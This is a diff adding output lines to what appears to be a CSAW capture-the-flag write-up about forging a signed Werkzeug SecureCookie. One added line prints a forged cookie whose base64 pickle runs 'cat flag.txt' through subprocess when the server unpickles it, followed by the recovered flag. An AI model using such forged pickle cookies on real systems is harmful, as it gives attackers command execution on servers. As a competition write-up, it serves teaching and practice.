@@ -249,6 +249,8 @@ x = SecureCookie(payload, SECRET_KEY)
 value = x.serialize()
 print(value)
 ```
+output:
+> x9WxLcbqt6K+XTRjOc/qLId9oaM=?name=gANYCgAAADB4ZGVhZGJlZWZxAC4=&username=gANYDQAAAG1lb3dfMzI2ZGNhZTVxAC4=
 let's update our session and see the changes now 
 ![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/345e4fb3-f290-47fd-a4f8-60743ee88d2c.png)
 
@@ -275,4 +277,13 @@ value = x.serialize()
 print(value)
 print(SecureCookie.unserialize(value, SECRET_KEY))
 ```
+output: 
+> 1YXfVvm1SHcNNZm/KXpktHC/RnM=?name=gANjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcQBdcQEoWAMAAABjYXRxAlgIAAAAZmxhZy50eHRxA2WFcQRScQUu&username=gANYDQAAAG1lb3dfMzI2ZGNhZTVxAC4=
 
+and bingoo here is the flag ^^
+![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/b8cd7218-eb7a-4c8e-bfec-1e23d81f9e2f.png)
+
+##flag{werks_on_my_box}
+
+it was realy fun game , thanks CSAW ^^
+0x deadbeef @DC21321
